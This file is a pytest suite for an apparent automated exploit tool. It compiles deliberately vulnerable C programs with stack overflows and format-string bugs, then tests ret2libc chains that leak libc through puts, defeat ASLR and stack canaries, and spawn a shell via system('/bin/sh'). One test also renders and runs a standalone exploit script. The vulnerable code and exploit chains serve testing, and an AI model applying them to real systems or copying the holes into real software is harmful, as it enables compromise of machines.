"""ret2libc with a runtime puts() leak: defeat ASLR without a `system` PLT entry, on a no-PIE
x86-64 target that imports puts but not system. The pure primitives (libc symbol/GOT reading,
base resolution, the leak-stage builder) are unit-tested; the two-stage harness is proven
end-to-end by spawning a real shell that echoes a marker."""
import glob
import shutil
import struct
import subprocess

import pytest
from lykos.analyze.poc import leak, rop

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/usr/lib/libc.so.6")), None)


def test_libc_symbols_and_got_match_readelf():
    """The stdlib dynsym/reloc readers agree with readelf on a real libc + a compiled binary."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    data = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(data, ("puts", "system", "read"))
    assert set(syms) == {"puts", "system", "read"} and all(v > 0 for v in syms.values())
    # cross-check one against readelf --dyn-syms
    if shutil.which("readelf"):
        out = subprocess.run(["readelf", "--dyn-syms", _SYS_LIBC], capture_output=True,
                             text=True).stdout
        for ln in out.splitlines():
            p = ln.split()
            if len(p) >= 8 and p[7].split("@")[0] == "system" and "FUNC" in ln:
                assert syms["system"] == int(p[1], 16)
                break
    assert rop.find_string(data, b"/bin/sh")            # "/bin/sh" is present in libc
    # a real libc base is page-aligned; the resolver rejects a non-aligned "leak"
    assert rop.resolve_libc_base(0x7f1234500000 + syms["puts"], syms["puts"]) == 0x7f1234500000
    assert rop.resolve_libc_base(0x7f1234500123 + syms["puts"], syms["puts"]) is None


def test_build_leak_puts_structure():
    p = rop.build_leak_puts(40, pop_rdi=0x401176, got=0x404000, puts_plt=0x401060,
                            ret_to=0x4011ac)
    q = lambda o: struct.unpack_from("<Q", p, o)[0]     # noqa: E731
    assert q(40) == 0x401176 and q(48) == 0x404000 and q(56) == 0x401060 and q(64) == 0x4011ac


def test_got_entries_enumerates_every_slot(r2l_bin):
    """got_entries lists the whole PLT GOT (the arbitrary-write target set for an indexed-write
    hijack); every slot must agree with the single-symbol got_entry reader."""
    data = r2l_bin.read_bytes()
    all_got = rop.got_entries(data)
    assert "puts" in all_got and "read" in all_got       # both libc imports have slots
    for name, slot in all_got.items():
        assert rop.got_entry(data, name) == slot          # agrees with the per-symbol reader
        assert slot > 0


def _r2l_src(read_call: str) -> str:
    """The ret2libc target, parameterised ONLY by the read that owns the overflow, so the positive
    and its negative control are byte-identical but for that call (supwngo _90_neg).
    """
    return (
        '#include <stdio.h>\n#include <unistd.h>\n'
        # a pop rdi;ret gadget the tiny binary would otherwise lack (a solvable target provides it)
        '__asm__(".text\\n.global g\\n g: pop %rdi\\n ret\\n");\n'
        'void vuln(void){ char b[32]; puts("go"); ' + read_call + '; }\n'
        'int main(void){ setvbuf(stdout,0,2,0); while(1) vuln(); return 0; }\n')


def _build_r2l(tmp_path_factory, name, read_call):
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64":
        pytest.skip("ret2libc fixture is x86-64 native only")
    if not _SYS_LIBC:
        pytest.skip("no system libc to resolve offsets from")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp(name)
    (d / "v.c").write_text(_r2l_src(read_call))
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build ret2libc fixture")
    return exe


@pytest.fixture
def r2l_bin(tmp_path_factory):
    return _build_r2l(tmp_path_factory, "r2l", "read(0,b,400)")           # overflow: the bug


@pytest.fixture
def r2l_safe_bin(tmp_path_factory):
    # the negative control: the read is bounded to the buffer, so there is no overflow and no
    # return-address control -- everything else (the win gadget, puts, the loop) is identical.
    return _build_r2l(tmp_path_factory, "r2l_safe", "read(0,b,sizeof b)")  # bounds-fixed: no bug


def test_ret2libc_leak_spawns_a_shell(r2l_bin):
    """End-to-end: a no-PIE binary that imports puts (not system) and runs under ASLR is exploited
    to a real shell by leaking libc via puts(), resolving the base, and calling system("/bin/sh")."""
    exe = r2l_bin
    data = exe.read_bytes()
    pop_rdi = rop.find_gadget(data, "pop_rdi")
    puts_plt = rop.resolve_plt(str(exe), "puts")
    puts_got = rop.got_entry(data, "puts")
    ret_align = rop.find_gadget(data, "ret")
    assert pop_rdi and puts_plt and puts_got, "fixture address resolution failed"
    nm = subprocess.run(["nm", str(exe)], capture_output=True, text=True).stdout
    main = next((int(l.split()[0], 16) for l in nm.splitlines() if l.endswith(" T main")), None)
    assert main
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("puts", "system"))
    binsh_off = rop.find_string(ld, b"/bin/sh")
    assert syms.get("puts") and syms.get("system") and binsh_off

    res = leak.ret2libc_leak(exe, exe.parent, offset=40, pop_rdi=pop_rdi, puts_plt=puts_plt,
                             puts_got=puts_got, ret_to=main, ret_gadget=ret_align,
                             puts_off=syms["puts"], system_off=syms["system"], binsh_off=binsh_off,
                             timeout=8.0)
    assert res["ok"], f"ret2libc did not confirm a shell: {res.get('reason')} (leaked={res.get('leaked')})"
    assert res["base"] % 0x1000 == 0                     # a real, page-aligned libc base was recovered
    assert res["technique"] == "ret2libc"                # the system() finisher, tried first


def test_ret2libc_leak_tries_the_one_gadget_finisher(r2l_bin):
    """With system() disabled, the leak path falls back to the one-gadget finisher: it must attempt
    a one-gadget candidate (re-triggering the overflow with a single-jump libc address) rather than
    give up at the leak. A bogus candidate cannot spawn a shell, so this asserts the path RUNS and
    declines cleanly -- a real one-gadget confirmation depends on the loaded libc actually having
    a pattern-matchable one-gadget (common on older/CTF glibc; find_one_gadgets is unit-tested)."""
    from lykos.analyze.poc import exploit
    data = r2l_bin.read_bytes()
    pop_rdi = rop.find_gadget(data, "pop_rdi")
    puts_plt = rop.resolve_plt(str(r2l_bin), "puts")
    puts_got = rop.got_entry(data, "puts")
    main = exploit.elf_functions(data).get("main")
    ld = open(_SYS_LIBC, "rb").read()
    puts_off = rop.libc_symbols(ld, ("puts",)).get("puts")
    # a deliberately non-functional one-gadget offset: exercises the finisher build/attempt path
    res = leak.ret2libc_leak(r2l_bin, r2l_bin.parent, offset=40, pop_rdi=pop_rdi, puts_plt=puts_plt,
                             puts_got=puts_got, ret_to=main,
                             ret_gadget=rop.find_gadget(data, "ret"),
                             puts_off=puts_off, system_off=None, binsh_off=None,
                             one_gadgets=[0x1234], timeout=6.0)
    assert res["ok"] is False and "no finisher" in res["reason"]


# --- integration: the exploit stage picks ret2libc-leak and files a confirmed L3 -----------------
@pytest.fixture
def pool(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


def test_exploit_stage_files_l3_ret2libc(store, case, pool, r2l_bin):
    """End-to-end through the ladder: a no-PIE binary importing puts (not system) under ASLR is
    driven by the exploit stage to a CONFIRMED L3 ret2libc PoC (a shell spawns and echoes a marker),
    with no /bin/sh string or system@plt in the image."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, r2l_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    # pin the denorm fields the plan gates on (a tiny asm-light binary can trip tool-based triage)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "off"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"offset": 40})
    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"no confirmed L3 ret2libc PoC (pocs={[(p.level, p.verified) for p in pocs]})"


def test_exploit_stage_declines_the_patched_ret2libc(store, case, pool, r2l_safe_bin):
    """Negative control (supwngo _90_neg): the SAME target with the overflow removed must NOT yield
    a confirmed L3. Driven through the SAME stage with the SAME offset=40 as the positive, so a
    decline is attributable to the missing overflow alone -- not a missing gadget, string, or path.
    A confirmed L3 here would mean the stage credited a "solve" NOT caused by a bug: the exact false
    positive the real, forgery-proof detonation exists to prevent (offset given != shell proven)."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, r2l_safe_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "off"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"offset": 40})
    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert not any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"patched target wrongly credited a confirmed L3: {[(p.level, p.verified) for p in pocs]}"


def test_recover_libc_base_needs_two_symbol_pointers():
    """recover_libc_base recovers a libc load base from >=2 leaked SYMBOL pointers (page-offset
    match), and honestly refuses a lone match or a bare return-address-into-libc."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("puts", "system", "printf"))
    base = 0x7F4400000000
    assert rop.recover_libc_base([base + syms["puts"], base + syms["system"]], ld) == base
    assert rop.recover_libc_base([base + syms["puts"]], ld) is None          # one match: unsure
    assert rop.recover_libc_base([base + 0xA03E6], ld) is None               # a return addr, no sym
    # real symbol pointers survive being mixed with stack junk
    assert rop.recover_libc_base(
        [0x7FFF12340000, base + syms["puts"], 0x40, base + syms["printf"]], ld) == base


@pytest.fixture
def pie_leak_bin(tmp_path_factory):
    """A PIE binary that leaks a libc symbol pointer (stdout = &_IO_2_1_stdout_) then has a stack
    overflow -- the analyst-assisted PIE ret2libc scenario."""
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64":
        pytest.skip("x86-64 native only")
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("pier2l")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <unistd.h>\n'
        'void leaker(){ printf("leak:%p\\n", stdout); fflush(stdout); }\n'
        'void pwn(){ char b[64]; read(0,b,400); }\n'
        'int main(){ setvbuf(stdout,0,2,0); while(1){ leaker(); pwn(); } }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-fpie", "-pie", "-fno-stack-protector", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build PIE fixture")
    return exe


def test_analyst_ret2libc_pie_spawns_shell(pie_leak_bin):
    """A PIE binary under ASLR is exploited to a real shell with NO pie_base: the analyst names the
    leaked libc symbol, the harness resolves libc_base, and a pure-libc ROP calls system("/bin/sh")."""
    ld = open(_SYS_LIBC, "rb").read()
    res = leak.analyst_ret2libc(pie_leak_bin, pie_leak_bin.parent, offset=72, libc_data=ld,
                                leak_sym="_IO_2_1_stdout_", timeout=8.0)
    assert res["ok"], f"pure-libc ret2libc did not spawn a shell: {res.get('reason')}"
    assert res["base"] % 0x1000 == 0
    # leak_offset works the same as naming the symbol
    off = rop.libc_symbols(ld, ("_IO_2_1_stdout_",))["_IO_2_1_stdout_"]
    res2 = leak.analyst_ret2libc(pie_leak_bin, pie_leak_bin.parent, offset=72, libc_data=ld,
                                 leak_offset=off, timeout=8.0)
    assert res2["ok"]


def test_exploit_stage_files_l3_pie_ret2libc(store, case, pool, pie_leak_bin):
    """End-to-end through the ladder with strategy=ret2libc: a PIE binary under ASLR, given the
    analyst's leak symbol, is driven to a CONFIRMED L3 PIE ret2libc (shell spawned, marker echoed)."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, pie_leak_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "on"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"strategy": "ret2libc", "offset": 72,
                                        "leak_sym": "_IO_2_1_stdout_"})
    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"no confirmed L3 PIE ret2libc (pocs={[(p.level, p.verified) for p in pocs]})"


def test_find_canary_and_prefix():
    """find_canary picks the low-byte-0x00 high-entropy word out of a leak and ignores pointers;
    build_canary_prefix writes it back at the right slot."""
    import struct
    canary = 0x8722C75DC372EC00
    vals = [0x7FFDFF9A29B0, 0x40, 0x711199EA03E6, canary, 0x401274]   # stack, small, libc, CANARY, code
    assert rop.find_canary(vals) == canary
    assert rop.find_canary([0x7FFDFF9A29B0, 0x401274]) is None        # no canary present
    pre = rop.build_canary_prefix(72, canary, 88)
    assert len(pre) == 88 and struct.unpack_from("<Q", pre, 72)[0] == canary
    assert pre[:72] == b"A" * 72 and pre[80:88] == b"B" * 8


@pytest.fixture
def canary_bin(tmp_path_factory):
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64":
        pytest.skip("x86-64 native only")
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("canary")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <unistd.h>\n'
        '__asm__(".text\\n.global g\\n g: pop %rdi\\n ret\\n");\n'
        'void vuln(){ char b[64]; read(0,b,64); printf(b); puts("go"); read(0,b,400); }\n'
        'int main(){ setvbuf(stdout,0,2,0); while(1) vuln(); return 0; }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fstack-protector-all", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build canary fixture")
    return exe


def test_canary_ret2libc_spawns_shell(canary_bin):
    """A canary-protected no-PIE binary is exploited to a shell: the canary is leaked via the format
    string and written back, then a two-stage puts-leak ret2libc runs system("/bin/sh")."""
    from lykos.analyze.poc import exploit as ex
    data = canary_bin.read_bytes()
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("puts", "system"))
    res = leak.canary_ret2libc(
        canary_bin, canary_bin.parent, offset=88, canary_offset=72, ret_offset=88,
        canary_trigger=b"%p" + b".%p" * 19 + b"\n", pop_rdi=rop.find_gadget(data, "pop_rdi"),
        puts_plt=rop.resolve_plt(str(canary_bin), "puts"), puts_got=rop.got_entry(data, "puts"),
        ret_to=ex.elf_functions(data).get("main"), ret_gadget=rop.find_gadget(data, "ret"),
        puts_off=syms["puts"], system_off=syms["system"], binsh_off=rop.find_string(ld, b"/bin/sh"),
        loop_feed=b"A\n", timeout=8.0)
    assert res["ok"], f"canary ret2libc did not spawn a shell: {res.get('reason')}"
    assert (res["canary"] & 0xFF) == 0                       # a real canary: null low byte


def test_exploit_stage_files_l3_canary_ret2libc(store, case, pool, canary_bin):
    """End-to-end through the ladder with strategy=canary: a canary-protected no-PIE binary is
    driven to a CONFIRMED L3 ret2libc, leaking and replaying the canary."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, canary_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "off", "canary": "on"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"strategy": "canary", "offset": 88, "canary_offset": 72,
                                        "ret_offset": 88, "canary_trigger": "%p" + ".%p" * 19 + "\n",
                                        "loop_feed": "A\n"})
    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"no confirmed L3 canary ret2libc (pocs={[(p.level, p.verified) for p in pocs]})"


def test_exploit_stage_auto_defeats_canary_no_params(store, case, pool, canary_bin):
    """P3: strategy=auto with NO canary params. The stage PROVOKES the canary leak itself and
    DISCOVERS the canary/return offsets via the __stack_chk_fail threshold (discover_canary_offset),
    then ret2libc's past the canary to a confirmed L3 shell -- the fully-automatic canary defeat."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, canary_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "off", "canary": "on"}, file_type="elf")
    # no strategy, no canary_trigger, no offsets -> the auto path must find everything itself
    run = enqueue_exploit(q, t, params={"input_mode": "stdin", "timeout": 20})
    assert pool.wait_idle(240) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"auto canary defeat produced no confirmed L3 (pocs={[(p.level, p.verified) for p in pocs]})"


def test_classify_leak_auto_recovers_libc_and_canary():
    """classify_leak auto-recovers the libc base (from >=2 leaked libc symbol pointers) and the
    canary from one burst, without an analyst naming any slot."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    from lykos.analyze.poc import leak
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("puts", "system"))
    base = 0x7F5500000000
    canary = 0x8722C75DC372EC00
    # a realistic burst: a stack ptr, the canary, two libc symbol pointers
    vals = [0x7FFDFF9A29B0, canary, base + syms["puts"], base + syms["system"]]
    cls = leak.classify_leak(vals, b"\x7fELF" + b"\x00" * 60, ld)
    assert cls["libc_base"] == base
    assert cls["canary"] == canary
    # no libc data -> libc_base stays None (still finds the canary)
    assert leak.classify_leak(vals, b"", b"")["libc_base"] is None
    assert leak.classify_leak(vals, b"", b"")["canary"] == canary


def test_le_pointer_words_harvests_binary_leak():
    """A stack over-read (CWE-125) echoes memory as RAW bytes, not hex. _le_pointer_words recovers
    the x86-64 userspace pointers (0x00007f.. libc/mmap, 0x000055/56.. PIE) from that binary dump so
    a leak with no format-string sink is still usable -- what the hex-only harvest missed."""
    from lykos.analyze.poc.leak import _le_pointer_words
    libc_ptr = 0x7F5533445566
    pie_ptr = 0x555555554abc
    noise = b"garbage \x01\x02 text "
    dump = noise + libc_ptr.to_bytes(8, "little") + b"\xff\xff" + pie_ptr.to_bytes(8, "little")
    found = _le_pointer_words(dump)
    assert libc_ptr in found and pie_ptr in found
    # a small int and a stack-ish 0x7ffd.. value without the 0x0000 top bytes are NOT pointers
    assert not _le_pointer_words((123).to_bytes(8, "little"))


def test_libc_version_parses_glibc_symbols():
    """glibc version from the max GLIBC_2.NN symbol-version string -- used to gate heap techniques
    (hooks/safe-linking/double-free-key/House-of-Force) instead of assuming a fixed version."""
    import glob
    assert rop.libc_version(b"x GLIBC_2.17\x00 GLIBC_2.31\x00 GLIBC_2.2.5\x00 y") == (2, 31)
    assert rop.libc_version(b"no glibc version strings here") is None
    libs = (glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
            or glob.glob("/lib/x86_64-linux-gnu/libc.so.6"))
    if libs:
        v = rop.libc_version(open(libs[0], "rb").read())
        assert v and v[0] == 2 and v[1] >= 27           # a real, modern glibc


def test_build_leak_write_layout():
    """The robust non-puts leaker: write(1, got, 8) emits exactly 8 raw address bytes. The chain
    must set rdi=1, rsi=got, rdx=8 then call write@plt and loop back to ret_to."""
    import struct
    s1 = rop.build_leak_write(72, pop_rdi=0x4011aa, pop_rsi=0x4011ac, pop_rdx=0x4011ae,
                              got=0x404038, write_plt=0x401050, ret_to=0x401176)
    tail = s1[72:]
    words = [struct.unpack("<Q", tail[i:i + 8])[0] for i in range(0, len(tail) - 7, 8)]
    # pop rdi;1; pop rsi;got; pop rdx;8; write@plt; ret_to
    assert words[:7] == [0x4011aa, 1, 0x4011ac, 0x404038, 0x4011ae, 8, 0x401050]
    assert words[-1] == 0x401176


def test_analyst_ret2libc_auto_mode_recovers_base(pie_leak_bin):
    """With no leak_sym/leak_offset, analyst_ret2libc falls back to recover_libc_base on the dump --
    but this fixture leaks a single symbol, so auto correctly cannot corroborate a base and reports
    it rather than firing a bogus chain (the analyst-named path still works, tested above)."""
    ld = open(_SYS_LIBC, "rb").read()
    res = leak.analyst_ret2libc(pie_leak_bin, pie_leak_bin.parent, offset=72, libc_data=ld,
                                timeout=6.0)   # no leak_sym: auto
    # single-symbol leak -> auto cannot corroborate -> honest failure (not a false success)
    assert res["ok"] is False


def test_recover_libc_base_ignores_stack_junk():
    """Curated anchors: >=2 real libc symbol pointers recover the base, but stack/PIE junk (which
    with thousands of anchors used to coincidentally corroborate a bogus base) yields None."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    import random
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("_IO_2_1_stdout_", "_IO_2_1_stderr_"))
    base = 0x7F4400000000
    assert rop.recover_libc_base([base + syms["_IO_2_1_stdout_"],
                                  base + syms["_IO_2_1_stderr_"]], ld) == base
    random.seed(1)
    junk = [random.randint(0x7FFC00000000, 0x7FFFFFFFFFFF) & ~0xF for _ in range(24)]
    assert rop.recover_libc_base(junk, ld) is None


@pytest.fixture
def pie_fmtleak_bin(tmp_path_factory):
    """PIE binary that leaks two libc symbols via a format string, then overflows -- the shape
    strategy=auto should solve with NO analyst config (auto leak classification)."""
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("pieauto")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <unistd.h>\n'
        'void lk(){ char b[64]; read(0,b,64); printf(b, stdout, stderr); puts(""); }\n'
        'void pw(){ char b[64]; read(0,b,400); }\n'
        'int main(){ setvbuf(stdout,0,2,0); while(1){ lk(); pw(); } }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-fpie", "-pie", "-fno-stack-protector", "-w", str(d / "v.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("build failed")
    return exe


def test_strategy_auto_pie_ret2libc(store, case, pool, pie_fmtleak_bin):
    """End-to-end: strategy=auto on a PIE target with a reachable format-string libc leak reaches a
    CONFIRMED L3 with NO analyst leak config -- auto_provoke_leak + recover_libc_base do it."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, pie_fmtleak_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "on"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"strategy": "auto", "offset": 72})   # NO leak config
    assert pool.wait_idle(120) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"strategy=auto did not auto-solve PIE ret2libc (pocs={[(p.level, p.verified) for p in pocs]})"


def test_render_canary_script_reproduces_shell(canary_bin, tmp_path):
    """The bundled standalone reproducer (render_canary_script) leaks the canary, defeats ASLR via
    the puts leak, and pops a shell on its own -- the canary L3 bundle is self-reproducing (it used
    to ship a placeholder that could not run)."""
    import subprocess as sp

    from lykos.analyze.poc import exploit as ex
    data = canary_bin.read_bytes()
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("puts", "system"))
    script = leak.render_canary_script(
        canary_offset=72, ret_offset=88, canary_trigger=b"%p" + b".%p" * 19 + b"\n",
        pop_rdi=rop.find_gadget(data, "pop_rdi"), puts_plt=rop.resolve_plt(str(canary_bin), "puts"),
        puts_got=rop.got_entry(data, "puts"), ret_to=ex.elf_functions(data).get("main"),
        puts_off=syms["puts"], system_off=syms["system"], binsh_off=rop.find_string(ld, b"/bin/sh"),
        ret_gadget=rop.find_gadget(data, "ret"), loop_feed=b"A\n")
    sf = tmp_path / "exploit.py"; sf.write_bytes(script)
    r = sp.run(["python3", str(sf), str(canary_bin)], capture_output=True, timeout=60)
    assert r.returncode == 0 and b"uid=" in r.stdout, (r.stdout[:200], r.stderr[:200])
